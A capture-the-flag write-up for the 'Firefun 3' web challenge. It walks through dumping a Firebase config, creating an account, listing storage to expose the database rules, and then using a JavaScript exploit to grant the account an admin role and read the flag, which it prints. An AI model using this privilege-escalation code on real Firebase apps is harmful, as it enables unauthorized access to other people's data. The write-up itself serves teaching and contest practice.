<h1>Firefun 3 ~ Web</h1>
<h2>Description and Analysis</h2>
<blockquote>
Our fireplace company was all set to take off for the moon, then we had to shut it all down. All that's left is a simple landing page.

-ProfNinja

Dedicated to Nisala

https://fire.prof.ninja/
</blockquote>

<p>
In this challenge we were given only a landing page with fire as a reference to Firebase, later on I figured out this is similar challange from the last year or from last CTF :shrug:<br>
Actually this (https://squ1rrel.dev/squ1rrel-personal-website) since this was dedicated to that person.

<h2>Solution</h2>

We dump the the config from path `/_/firebase/init.json`

```json
{
    "apiKey": "AIzaSyBX_qnDyJ9pl_csJUprUywtAh9lUbVqPFU",
    "authDomain": "udctf24.firebaseapp.com",
    "databaseURL": "https://udctf24-default-rtdb.firebaseio.com",
    "projectId": "udctf24",
    "messagingSenderId": "926833250426",
    "storageBucket": "udctf24.firebasestorage.app"
}

```

One way of authentication is via email and password so we can create account and sign in for test

```python3
import pyrebase

# Firebase config that we dumped
config = {
    "apiKey": "AIzaSyBX_qnDyJ9pl_csJUprUywtAh9lUbVqPFU",
    "authDomain": "udctf24.firebaseapp.com",
    "databaseURL": "https://udctf24-default-rtdb.firebaseio.com",
    "projectId": "udctf24",
    "messagingSenderId": "926833250426",
    "storageBucket": "udctf24.firebasestorage.app"
}

firebase = pyrebase.initialize_app(config)
auth = firebase.auth()

email = "test@test.com" # just a placeholder, add yours
password = "newpassword123" 
new_user = auth.create_user_with_email_and_password(email, password)
print("New User ID:", new_user['localId'])


user = auth.sign_in_with_email_and_password(email, password)
id_token = user['idToken']
print("Signed in, token: ", id_token)
```

Since this worked, we would have to find out what rules are in place - I spent quite of time blindly looking how to do this since you could fetch `db.child("rules")` but that would return `None`.
However one of the previous writeups used the reference to the root path `/` of storage so we could list and download if anything is there.
For this JavaScript Firebase SDK is more suitable.

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>

    <!-- Include Firebase SDK -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-app.js";
        import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-auth.js";
        import { getStorage, ref, listAll, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-storage.js";

        // firebase config that we dumped
        const firebaseConfig = {
            apiKey: "AIzaSyBX_qnDyJ9pl_csJUprUywtAh9lUbVqPFU",
            authDomain: "udctf24.firebaseapp.com",
            databaseURL: "https://udctf24-default-rtdb.firebaseio.com",
            projectId: "udctf24",
            storageBucket: "udctf24.firebasestorage.app",
            messagingSenderId: "926833250426"
        };

        // initialize Firebase
        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const storage = getStorage(app);

        // user creds
        const email = "test@test.com"; //placeholder again
        const password = "newpassword123";

        // auth user
        async function authenticateUser() {
            try {
                const userCredential = await signInWithEmailAndPassword(auth, email, password);
                console.log("Successfully authenticated:", userCredential.user.email);
                return userCredential.user;
            } catch (error) {
                console.error("Authentication failed:", error.message);
                throw error;
            }
        }

        // list and download if some file is found
        async function listAndDownloadFiles() {
            try {
                const user = await authenticateUser();
                console.log("Listing and downloading files from Firebase Storage...");

                // reference to the root of the storage bucket
                const storageRef = ref(storage, "/");

                // list all files in the storage bucket
                const result = await listAll(storageRef);

                if (result.items.length === 0) {
                    console.log("No files found in Firebase Storage.");
                } else {
                    for (const itemRef of result.items) {
                        console.log("Found file:", itemRef.fullPath);
                        await downloadFile(itemRef.fullPath);
                    }
                }
            } catch (error) {
                console.error("Failed to list or download files:", error.message);
            }
        }

        // download a file from firebase storage
        async function downloadFile(filePath) {
            try {
                const fileRef = ref(storage, filePath);
                const url = await getDownloadURL(fileRef);
                console.log("Download URL:", url);

                // create a link element to download the file
                const link = document.createElement('a');
                link.href = url;
                link.download = filePath.split('/').pop();
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);

                console.log("File download initiated:", filePath);
            } catch (error) {
                console.error("Failed to download file:", error.message);
            }
        }

        // start the process as soon as the script is loaded
        listAndDownloadFiles();
    </script>
</body>
</html>
```
This successfully dumped us an image of rules 

![image](https://firebasestorage.googleapis.com/v0/b/udctf24.firebasestorage.app/o/is_this_secure%3F.png?alt=media&token=e027f317-af0e-4170-beab-eead9fb63a1b)

Rules:

```{
  "rules": {
    "users": {
      "$userid": {
        ".read": "$userid === auth.uid",
        ".write": "$userid === auth.uid"
      }
    },
    "rules": {
      ".read": true,
      ".write": false
    },
    "flag": {
      ".write": false,
      ".read": "root.child('users').child(auth.uid).child('roles').child('admin').exists()"
    }
  }
}
```

We see that we have access to read the flag if user is authenticated and has role of admin. Since we have write access to users with same auth, we can just add the role to admin and get the flag.
So last exploit to get the flag is:

```<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-app.js";
        import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-auth.js";
        import { getDatabase, ref, get, set } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-database.js";

        
        const firebaseConfig = {
            apiKey: "AIzaSyBX_qnDyJ9pl_csJUprUywtAh9lUbVqPFU",
            authDomain: "udctf24.firebaseapp.com",
            databaseURL: "https://udctf24-default-rtdb.firebaseio.com",
            projectId: "udctf24",
            storageBucket: "udctf24.firebasestorage.app",
            messagingSenderId: "926833250426"
        };

       
        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getDatabase(app);

        
        const email = "test@test.com"; // placeholder again
        const password = "newpassword123";

        
        async function authenticateUser() {
            try {
                const userCredential = await signInWithEmailAndPassword(auth, email, password);
                console.log("Successfully authenticated:", userCredential.user.email);
                return userCredential.user;
            } catch (error) {
                console.error("Authentication failed:", error.message);
                throw error;
            }
        }

        // escalate here
        async function escalatePrivileges(userId) {
            try {
                const adminRef = ref(db, `users/${userId}/roles/admin`);
                await set(adminRef, true);
                console.log("Privilege escalation succeeded. User is now an 'admin'.");
                accessFlag();
            } catch (error) {
                console.error("Privilege escalation failed:", error.message);
            }
        }

        // get flag
        async function accessFlag() {
            try {
                const flagRef = ref(db, "flag");
                const snapshot = await get(flagRef);

                if (snapshot.exists()) {
                    console.log("Flag found:", snapshot.val());
                } else {
                    console.log("Flag not found or access denied.");
                }
            } catch (error) {
                console.error("Failed to access the flag:", error.message);
            }
        }

        // start
        async function startExploit() {
            try {
                const user = await authenticateUser();
                const userId = user.uid;
                await escalatePrivileges(userId);
            } catch (error) {
                console.error("Exploit failed:", error.message);
            }
        }

       
        startExploit();
    </script>
</body>
</html>
```

<b> FLAG: udctf{wh4t_4_sleuth_y0u_4r3!} </b>

<b>author: </b> [hebi](https://github.com/0xhebi)